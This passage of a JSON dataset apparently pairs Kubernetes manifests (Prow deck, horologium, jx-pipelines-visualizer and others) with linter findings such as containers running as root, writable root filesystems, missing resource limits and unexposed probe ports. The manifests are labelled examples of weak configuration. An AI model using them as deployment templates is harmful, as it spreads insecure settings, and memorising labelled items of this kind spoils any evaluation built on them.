    "manifest_path": "data/manifests/the_stack_sample/sample_1000.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.8.0\n    app.kubernetes.io/version: 1.8.0\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.8.0\n        app.kubernetes.io/version: 1.8.0\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.8.0\n        args:\n        - -resync-interval\n        - 60s\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.192.168.59.101.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jx-pipelines-visualizer\" does not have a read-only root file system"
  },
  {
    "id": "3245",
    "manifest_path": "data/manifests/the_stack_sample/sample_1000.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.8.0\n    app.kubernetes.io/version: 1.8.0\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.8.0\n        app.kubernetes.io/version: 1.8.0\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.8.0\n        args:\n        - -resync-interval\n        - 60s\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.192.168.59.101.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-pipelines-visualizer\" not found"
  },
  {
    "id": "3246",
    "manifest_path": "data/manifests/the_stack_sample/sample_1000.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.8.0\n    app.kubernetes.io/version: 1.8.0\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.8.0\n        app.kubernetes.io/version: 1.8.0\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.8.0\n        args:\n        - -resync-interval\n        - 60s\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.192.168.59.101.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jx-pipelines-visualizer\" is not set to runAsNonRoot"
  },
  {
    "id": "3247",
    "manifest_path": "data/manifests/the_stack_sample/sample_1002.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-allowed\n  labels:\n    app: nginx-allowed\nspec:\n  securityContext:\n    supplementalGroups:\n    - 101\n    fsGroup: 101\n  containers:\n  - name: nginx\n    image: nginxinc/nginx-unprivileged:1.19\n    resources:\n      limits:\n        cpu: 1\n        memory: 1Gi\n      requests:\n        cpu: 1\n        memory: 1Gi\n    ports:\n    - containerPort: 8080\n      protocol: TCP\n    securityContext:\n      runAsUser: 101\n      runAsGroup: 101\n      capabilities:\n        drop:\n        - ALL\n      allowPrivilegeEscalation: false\n    readinessProbe:\n      httpGet:\n        scheme: HTTP\n        path: /index.html\n        port: 8080\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        path: /index.html\n        port: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "3248",
    "manifest_path": "data/manifests/the_stack_sample/sample_1003.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: bucketrepo\n  labels:\n    chart: bucketrepo-0.1.54\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    fabric8.io/expose: 'true'\n    fabric8.io/ingress.annotations: 'kubernetes.io/ingress.class: nginx'\n  namespace: jx\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 8080\n    protocol: TCP\n    name: http\n  selector:\n    app: bucketrepo-bucketrepo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:bucketrepo-bucketrepo])"
  },
  {
    "id": "3249",
    "manifest_path": "data/manifests/the_stack_sample/sample_1005.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200116-52fe941d7\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "3250",
    "manifest_path": "data/manifests/the_stack_sample/sample_1005.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200116-52fe941d7\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "3251",
    "manifest_path": "data/manifests/the_stack_sample/sample_1005.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200116-52fe941d7\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "3252",
    "manifest_path": "data/manifests/the_stack_sample/sample_1005.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200116-52fe941d7\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "3253",
    "manifest_path": "data/manifests/the_stack_sample/sample_1006.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntuapp\n  labels:\n    app: ubuntuapp\n  annotations:\n    opencontrail.org/network: '{\"domain\":\"default-domain\", \"project\": \"admin\", \"name\":\"VN-01\"}'\nspec:\n  containers:\n  - name: ubuntuapp\n    image: ubuntu-upstart\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ubuntuapp\" is using an invalid container image, \"ubuntu-upstart\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3254",
    "manifest_path": "data/manifests/the_stack_sample/sample_1006.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntuapp\n  labels:\n    app: ubuntuapp\n  annotations:\n    opencontrail.org/network: '{\"domain\":\"default-domain\", \"project\": \"admin\", \"name\":\"VN-01\"}'\nspec:\n  containers:\n  - name: ubuntuapp\n    image: ubuntu-upstart\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ubuntuapp\" does not have a read-only root file system"
  },
  {
    "id": "3255",
    "manifest_path": "data/manifests/the_stack_sample/sample_1006.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntuapp\n  labels:\n    app: ubuntuapp\n  annotations:\n    opencontrail.org/network: '{\"domain\":\"default-domain\", \"project\": \"admin\", \"name\":\"VN-01\"}'\nspec:\n  containers:\n  - name: ubuntuapp\n    image: ubuntu-upstart\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ubuntuapp\" is not set to runAsNonRoot"
  },
  {
    "id": "3256",
    "manifest_path": "data/manifests/the_stack_sample/sample_1006.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntuapp\n  labels:\n    app: ubuntuapp\n  annotations:\n    opencontrail.org/network: '{\"domain\":\"default-domain\", \"project\": \"admin\", \"name\":\"VN-01\"}'\nspec:\n  containers:\n  - name: ubuntuapp\n    image: ubuntu-upstart\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ubuntuapp\" has cpu request 0"
  },
  {
    "id": "3257",
    "manifest_path": "data/manifests/the_stack_sample/sample_1006.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntuapp\n  labels:\n    app: ubuntuapp\n  annotations:\n    opencontrail.org/network: '{\"domain\":\"default-domain\", \"project\": \"admin\", \"name\":\"VN-01\"}'\nspec:\n  containers:\n  - name: ubuntuapp\n    image: ubuntu-upstart\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ubuntuapp\" has memory limit 0"
  },
  {
    "id": "3258",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "3259",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3260",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "3261",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"deck\" not found"
  },
  {
    "id": "3262",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "3263",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "3264",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
